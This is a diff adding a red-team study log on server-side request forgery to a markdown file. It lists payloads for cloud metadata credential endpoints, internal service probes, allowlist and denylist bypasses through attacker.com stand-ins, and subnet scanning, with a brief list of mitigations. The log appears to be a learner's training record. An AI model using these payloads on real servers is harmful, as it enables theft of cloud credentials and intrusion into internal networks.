@@ -730,3 +730,113 @@ Principle of least privilege for web server
 ◽ Advanced Persistence Techniques
 
 OPERATIONAL NOTES: File inclusion vulnerabilities remain prevalent in web applications despite being well-understood. RFI provides the most direct path to RCE, while LFI offers valuable intelligence for targeted attacks.
+
+# Red Monster Journey 🐲 
+## Server-Side Request Forgery (SSRF) Mastery
+
+### 🎯 MODULE COMPLETION: SSRF ATTACKS
+**Status:** Mastered ✅
+**Red Team Application:** Internal Network Access & Cloud Compromise
+
+### 🔴 SSRF TRADECRAFT DOCUMENTATION
+
+#### 📊 VULNERABILITY OVERVIEW
+SSRF vulnerabilities allow attackers to force servers to make arbitrary HTTP requests to internal resources, bypassing network segmentation and accessing restricted systems.
+
+#### 🎲 EXPLOITATION TECHNIQUES MASTERED
+
+##### SSRF TYPES & DETECTION
+```http
+# Regular SSRF (Response Visible)
+GET /fetch?url=http://attacker-controlled.com
+POST /webhook { "callback": "http://internal.service" }
+
+# Blind SSRF (No Response)
+GET /trigger?action=http://internal:8080/update
+INTERNAL NETWORK TARGETS
+bash
+# Cloud Metadata APIs
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance
+
+# Internal Services
+http://localhost:22      # SSH
+http://192.168.1.1:80   # Internal Router
+http://10.0.0.1:443     # Management Interface
+DEFENSE BYPASS TECHNIQUES
+http
+# Bypass Denylists
+http://127.0.0.1 → http://2130706433
+http://localhost → http://localhost.attacker.com
+http://192.168.1.1 → http://3232235777
+
+# Bypass Allowlists
+https://allowed.com@attacker.com
+http://attacker.com#allowed.com
+http://allowed.com.attacker.com
+
+# Open Redirect Abuse
+/redirect?target=http://internal.com
+/goto?url=http://169.254.169.254/
+🛠️ RED TEAM OPERATIONAL PROCEDURES
+RECONNAISSANCE PHASE
+Parameter analysis in URLs, forms, and API endpoints
+
+Identification of URL processing functionality
+
+Testing with external callback services (webhook.site)
+
+EXPLOITATION PHASE
+Internal Network Scanning
+
+http
+http://192.168.1.[1-254]:80/
+http://10.0.0.[1-255]:443/
+Cloud Environment Compromise
+
+http
+# AWS EC2 Metadata
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+Service Interaction
+
+http
+# Database Access
+http://localhost:3306/admin
+
+# Cache Systems  
+http://localhost:6379/info
+POST-EXPLOITATION
+Credential extraction from cloud metadata
+
+Internal service enumeration and targeting
+
+Network mapping for lateral movement planning
+
+📈 RISK ASSESSMENT
+Impact: CRITICAL (Network bypass, cloud compromise)
+
+Detection Difficulty: Medium (Server logs show unusual requests)
+
+Exploitation Complexity: Low-Medium
+
+🔧 MITIGATIONS UNDERSTOOD
+Network segmentation and egress filtering
+
+Input validation with allowlisting
+
+Cloud metadata service protection
+
+Web Application Firewall (WAF) rules
+
+🚀 PROGRESSION IN RED TEAM SKILL MATRIX
+✅ Network Security
+✅ Web Application Security
+✅ Cloud Security ← SSRF ADDED
+◽ Active Directory Exploitation
+◽ Advanced Persistence Techniques
+
+OPERATIONAL NOTES: SSRF represents one of the most powerful web vulnerabilities for Red Team operations, enabling complete bypass of network perimeter defenses and direct access to internal infrastructure and cloud environments.
